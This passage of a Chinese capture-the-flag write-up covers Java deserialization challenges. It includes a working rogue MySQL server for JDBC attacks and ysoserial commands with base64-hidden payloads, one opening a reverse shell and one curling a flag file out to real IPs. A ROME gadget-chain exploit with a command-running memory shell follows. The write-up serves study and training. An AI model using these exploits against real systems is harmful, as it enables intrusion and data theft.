      <span class="hljs-keyword">this</span>.info = info;
   }

   <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> </span>{
      <span class="hljs-keyword">try</span> {
         <span class="hljs-keyword">return</span> method.getName().equals(<span class="hljs-string">&quot;getAllInfo&quot;</span>) &amp;&amp; !<span class="hljs-keyword">this</span>.info.checkAllInfo() ? <span class="hljs-keyword">null</span> : method.invoke(<span class="hljs-keyword">this</span>.info, args);
      } <span class="hljs-keyword">catch</span> (Exception var5) {
         var5.printStackTrace();
         <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
      }
   }
}
</code></pre>
<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x501F;&#x6B64;&#x6253; JDBC &#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<blockquote>
<p>&#x5982;&#x679C;&#x653B;&#x51FB;&#x8005;&#x80FD;&#x591F;&#x63A7;&#x5236;JDBC&#x8FDE;&#x63A5;&#x8BBE;&#x7F6E;&#x9879;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x5176;&#x6307;&#x5411;&#x6076;&#x610F;MySQL&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;ObjectInputStream.readObject()&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;&#x4ECE;&#x800C;RCE&#x3002; </p>
</blockquote>
<p>&#x53C2;&#x8003;: <a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank">https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p>&#x6784;&#x9020;EXP</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> gdufs.challenge.web;

<span class="hljs-keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;
<span class="hljs-keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;
<span class="hljs-keyword">import</span> gdufs.challenge.web.model.Info;

<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        DatabaseInfo db = <span class="hljs-keyword">new</span> DatabaseInfo();
        db.setHost(<span class="hljs-string">&quot;81.70.101.91&quot;</span>);
        db.setPort(<span class="hljs-string">&quot;9999&quot;</span>);
        db.setUsername(<span class="hljs-string">&quot;root&quot;</span>);
        db.setPassword(<span class="hljs-string">&quot;&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);
        ClassLoader classLoader = db.getClass().getClassLoader();
        Class[] interfaces = db.getClass().getInterfaces();
        InfoInvocationHandler invocationHandler = <span class="hljs-keyword">new</span> InfoInvocationHandler(db);
        Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, invocationHandler);
        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream obj = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);
        obj.writeObject(db);
        obj.flush();
        obj.close();

        String payload = <span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray()));
        System.out.println(payload);
    }
}
</code></pre>
<p>&#x7136;&#x540E;&#x516C;&#x7F51;&#x5EFA;&#x7ACB;&#x6076;&#x610F; mysql</p>
<pre><code class="lang-python"><span class="hljs-comment"># coding=utf-8</span>
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> os

greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span>
response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">receive_data</span><span class="hljs-params">(conn)</span>:</span>
    data = conn.recv(<span class="hljs-number">1024</span>)
    print(<span class="hljs-string">&quot;[*] Receiveing the package : {}&quot;</span>.format(data))
    <span class="hljs-keyword">return</span> str(data).lower()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_data</span><span class="hljs-params">(conn,data)</span>:</span>
    print(<span class="hljs-string">&quot;[*] Sending the package : {}&quot;</span>.format(data))
    conn.send(binascii.a2b_hex(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_payload_content</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment">#file&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x4F7F;&#x7528;ysoserial&#x751F;&#x6210;&#x7684; &#x4F7F;&#x7528;&#x89C4;&#x5219;&#xFF1A;java -jar ysoserial [Gadget] [command] &gt; payload</span>
    file= <span class="hljs-string">r&apos;payload&apos;</span>
    <span class="hljs-keyword">if</span> os.path.isfile(file):
        <span class="hljs-keyword">with</span> open(file, <span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&apos;utf-8&apos;</span>)
        print(<span class="hljs-string">&quot;open successs&quot;</span>)

    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">&quot;open false&quot;</span>)
        <span class="hljs-comment">#calc</span>
        payload_content=<span class="hljs-string">&apos;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&apos;</span>
    <span class="hljs-keyword">return</span> payload_content

<span class="hljs-comment"># &#x4E3B;&#x8981;&#x903B;&#x8F91;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">()</span>:</span>

    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        conn, addr = sk.accept()
        print(<span class="hljs-string">&quot;Connection come from {}:{}&quot;</span>.format(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))

        <span class="hljs-comment"># 1.&#x5148;&#x53D1;&#x9001;&#x7B2C;&#x4E00;&#x4E2A; &#x95EE;&#x5019;&#x62A5;&#x6587;</span>
        send_data(conn,greeting_data)

        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
            <span class="hljs-comment"># &#x767B;&#x5F55;&#x8BA4;&#x8BC1;&#x8FC7;&#x7A0B;&#x6A21;&#x62DF;  1.&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;request login&#x62A5;&#x6587; 2.&#x670D;&#x52A1;&#x7AEF;&#x54CD;&#x5E94;response_ok</span>
            receive_data(conn)
            send_data(conn,response_ok_data)

            <span class="hljs-comment">#&#x5176;&#x4ED6;&#x8FC7;&#x7A0B;</span>
            data=receive_data(conn)
            <span class="hljs-comment">#&#x67E5;&#x8BE2;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x4FE1;&#x606F;,&#x5176;&#x4E2D;&#x4F1A;&#x53D1;&#x9001;&#x81EA;&#x5DF1;&#x7684; &#x7248;&#x672C;&#x53F7;</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:
                _payload=<span class="hljs-string">&apos;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&apos;</span>
                send_data(conn,_payload)
                data=receive_data(conn)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:
                _payload = <span class="hljs-string">&apos;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&apos;</span>
                send_data(conn, _payload)
                data = receive_data(conn)
            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:
                mysql_data = <span class="hljs-string">&apos;0100000102&apos;</span>
                mysql_data += <span class="hljs-string">&apos;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&apos;</span>
                mysql_data += <span class="hljs-string">&apos;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&apos;</span>
                <span class="hljs-comment"># &#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x52A0;&#x4E86;EOF Packet &#x5C31;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x8FD0;&#x884C;&#x5462;&#xFF1F;&#xFF1F;</span>
                <span class="hljs-comment"># &#x83B7;&#x53D6;payload</span>
                payload_content=get_payload_content()
                <span class="hljs-comment"># &#x8BA1;&#x7B97;payload&#x957F;&#x5EA6;</span>
                payload_length = str(hex(len(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&apos;0x&apos;</span>, <span class="hljs-string">&apos;&apos;</span>).zfill(<span class="hljs-number">4</span>)
                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]
                <span class="hljs-comment"># &#x8BA1;&#x7B97;&#x6570;&#x636E;&#x5305;&#x957F;&#x5EA6;</span>
                data_len = str(hex(len(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&apos;0x&apos;</span>, <span class="hljs-string">&apos;&apos;</span>).zfill(<span class="hljs-number">6</span>)
                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]
                mysql_data += data_len_hex + <span class="hljs-string">&apos;04&apos;</span> + <span class="hljs-string">&apos;fbfc&apos;</span>+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += <span class="hljs-string">&apos;07000005fe000022000100&apos;</span>
                send_data(conn, mysql_data)
                data = receive_data(conn)
            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:
                payload = <span class="hljs-string">&apos;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&apos;</span>
                send_data(conn, payload)
            <span class="hljs-keyword">break</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    HOST =<span class="hljs-string">&apos;0.0.0.0&apos;</span>
    PORT = <span class="hljs-number">9999</span>

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="hljs-comment">#&#x5F53;socket&#x5173;&#x95ED;&#x540E;&#xFF0C;&#x672C;&#x5730;&#x7AEF;&#x7528;&#x4E8E;&#x8BE5;socket&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x7ACB;&#x523B;&#x5C31;&#x53EF;&#x4EE5;&#x88AB;&#x91CD;&#x7528;.&#x4E3A;&#x4E86;&#x5B9E;&#x9A8C;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x7528;&#x7B49;&#x5F85;&#x5F88;&#x957F;&#x65F6;&#x95F4;</span>
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
    sk.bind((HOST, PORT))
    sk.listen(<span class="hljs-number">1</span>)

    print(<span class="hljs-string">&quot;start fake mysql server listening on {}:{}&quot;</span>.format(HOST,PORT))

    run()
</code></pre>
<p>ysoserial</p>
<pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xMDEuOTEvODg4OCAwJj4xJw==}|{base64,-d}|{bash,-i}&quot; &gt; payload
</code></pre><p>&#x4F46;&#x662F;&#x53CD;&#x5F39;shell&#x4E0D;&#x592A;&#x884C;, &#x5C31;&#x901A;&#x8FC7; curl &#x6570;&#x636E;&#x5916;&#x5E26;</p>
<pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,Y3VybCAtWCBQT1NUIC1kICJmbGFnPWBjYXQgL2ZsYWdfQVFVQWAiIGh0dHA6Ly8zOS45Ny4xMTQuNDM6ODg4OA==}|{base64,-d}|{bash,-i}&quot; &gt; payload
</code></pre><p>&#x8BBF;&#x95EE; /hello, data=Proxypayload &#x5373;&#x53EF;</p>
<h2 id="&#x9647;&#x539F;&#x6218;&#x75AB;ezjaba">[&#x9647;&#x539F;&#x6218;&quot;&#x75AB;&quot;]ezjaba</h2>
<p>&#x9898;&#x76EE;&#x94FE;&#x63A5;(web-ezjaba): <a href="https://buuoj.cn/match/matches/57/challenges" target="_blank">https://buuoj.cn/match/matches/57/challenges</a></p>
<p>jar&#x5305;&#x53CD;&#x7F16;&#x8BD1;&#x540E;&#x53EF;&#x4EE5;&#x770B;&#x5230; pom.xml &#x4E2D;&#x6709; rome &#x4F9D;&#x8D56;</p>
<pre><code>&lt;dependency&gt;
     &lt;groupId&gt;rome&lt;/groupId&gt;
     &lt;artifactId&gt;rome&lt;/artifactId&gt;
     &lt;version&gt;1.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>ROME&#x53CD;&#x5E8F;&#x5217;&#x5316;, &#x8FC7;&#x6EE4;&#x4E86;&#x4E24;&#x4E2A;&#x7C7B;</p>
<pre><code>java.util.HashMap
javax.management.BadAttributeValueExpException
</code></pre><p>&#x4F46;&#x662F;BackDoor&#x5E95;&#x4E0B;&#x7684;finally&#x5B8C;&#x6210;&#x4E86;BadAttributeValueExpException&#x7C7B;&#x9700;&#x8981;&#x505A;&#x7684;&#x4E8B;, &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x89E6;&#x53D1;toString, &#x539F;&#x6765;&#x7684;ROME&#x94FE;</p>
<p>&#x53C2;&#x8003;: <a href="https://blog.csdn.net/rfrder/article/details/121236409" target="_blank">https://blog.csdn.net/rfrder/article/details/121236409</a></p>
<pre><code>TemplatesImpl.getOutputProperties()
NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
NativeMethodAccessorImpl.invoke(Object, Object[])
DelegatingMethodAccessorImpl.invoke(Object, Object[])
Method.invoke(Object, Object...)
ToStringBean.toString(String)
ToStringBean.toString()
ObjectBean.toString()
EqualsBean.beanHashCode()
ObjectBean.hashCode()

HashMap&lt;K,V&gt;.hash(Object)
HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
</code></pre><p>&#x76F4;&#x63A5;&#x622A;&#x65AD;&#x4ECE;ToStringBean&#x5904;&#x5F00;&#x59CB;&#x6784;&#x5EFA;, &#x5373;&#x53EF;&#x76F4;&#x63A5;&#x89E6;&#x53D1;, &#x539F;&#x9898;&#x4E0D;&#x51FA;&#x7F51;, &#x6240;&#x4EE5;&#x9700;&#x8981;&#x8BBE;&#x7F6E;<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java" target="_blank">&#x5185;&#x5B58;&#x9A6C;</a>, &#x5C0F;&#x6539;&#x4E00;&#x4E0B;&#x5373;&#x53EF;&#x4F7F;&#x7528;</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> com.lyzy.ctf.ezjaba.exp;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;

<span class="hljs-keyword">import</span> java.lang.reflect.Method;
<span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpringEcho</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>{
    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            Class c = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);
            Method m = c.getMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);
            Object o = m.invoke(<span class="hljs-keyword">null</span>);
            c = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);
            m = c.getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);
<span class="hljs-comment">//        Method m1 = c.getMethod(&quot;getRequest&quot;);</span>
            Object resp = m.invoke(o);
<span class="hljs-comment">//        Object req = m1.invoke(o); // HttpServletRequest</span>
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);
<span class="hljs-comment">//        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(&quot;javax.servlet.http.HttpServletRequest&quot;).getDeclaredMethod(&quot;getHeader&quot;,String.class);</span>
<span class="hljs-comment">//        getHeader.setAccessible(true);</span>
            getWriter.setAccessible(<span class="hljs-keyword">true</span>);
            Object writer = getWriter.invoke(resp);
<span class="hljs-comment">//        String cmd = (String)getHeader.invoke(req, &quot;cmd&quot;);</span>
            String[] commands = <span class="hljs-keyword">new</span> String[<span class="hljs-number">3</span>];
            String charsetName = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span> : <span class="hljs-string">&quot;UTF-8&quot;</span>;
            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) {
                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;
                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;
            } <span class="hljs-keyword">else</span> {
                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;
                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;
            }
<span class="hljs-comment">//        commands[2] = cmd;</span>
            commands[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;cat /flag&quot;</span>;
            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());
            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);
            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);
        } <span class="hljs-keyword">catch</span> (Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>{

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>{

    }
}
</code></pre>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> com.lyzy.ctf.ezjaba.exp;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.net.URLEncoder;
<span class="hljs-keyword">import</span> java.util.HashMap;

<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;
<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;
<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{
                ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode()
        });
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());

        ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = <span class="hljs-keyword">new</span> EqualsBean(ToStringBean.class, toStringBean);
        ObjectBean objectBean = <span class="hljs-keyword">new</span> ObjectBean(String.class,<span class="hljs-string">&quot;ricky&quot;</span>);

<span class="hljs-comment">//        HashMap evilMap = new HashMap();</span>
<span class="hljs-comment">//        evilMap.put(objectBean,1);</span>
<span class="hljs-comment">//        evilMap.put(objectBean,1);</span>
<span class="hljs-comment">//        setFieldValue(objectBean,&quot;_equalsBean&quot;,equalsBean);</span>

        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(toStringBean);
        oos.close();

        System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray())));
<span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span>
<span class="hljs-comment">//        Object o = (Object)ois.readObject();</span>
<span class="hljs-comment">//        o.toString();</span>

    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(obj, value);
    }
}
</code></pre>
<h2 id="&#x5B89;&#x6D35;&#x676F;2021ezjson">[&#x5B89;&#x6D35;&#x676F;2021]ezjson</h2>
<p>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D; file=/proc/self/fd/5 &#x83B7;&#x5F97;&#x6E90;&#x7801;</p>
